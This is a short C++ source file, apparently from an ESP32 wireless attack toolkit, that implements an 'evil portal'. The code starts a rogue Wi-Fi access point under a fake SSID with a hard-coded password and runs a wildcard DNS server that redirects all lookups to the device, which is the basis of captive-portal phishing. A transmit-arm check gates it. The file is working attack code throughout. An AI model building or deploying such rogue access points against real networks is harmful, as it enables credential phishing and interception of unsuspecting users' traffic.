#include "evil_portal.h"
#include "tx_arm.h"
#include <WiFi.h>
#include <DNSServer.h>

namespace EvilPortal {

static DNSServer dnsServer;
static bool active = false;

void start(const String &fakeSSID, const String &portalHTML, uint8_t channel) {
    if (!TxArm::isArmed()) {
        Serial.println("TX not armed");
        return;
    }

    Serial.println("Starting evil portal: " + fakeSSID);

    WiFi.softAP(fakeSSID.c_str(), "password123", channel);
    IPAddress IP(192, 168, 1, 1);
    IPAddress NMask(255, 255, 255, 0);
    WiFi.softAPConfig(IP, IP, NMask);

    dnsServer.start(53, "*", IP);
    active = true;

    Serial.println("Evil portal active on " + fakeSSID);
    Serial.println("DNS redirecting to " + IP.toString());
}

void stop() {
    if (active) {
        dnsServer.stop();
        WiFi.softAPdisconnect(true);
        active = false;
        Serial.println("Evil portal stopped");
    }
}

bool isActive() {
    return active;
}

void processRequests() {
    if (active) {
        dnsServer.processNextRequest();
    }
}

} // namespace EvilPortal
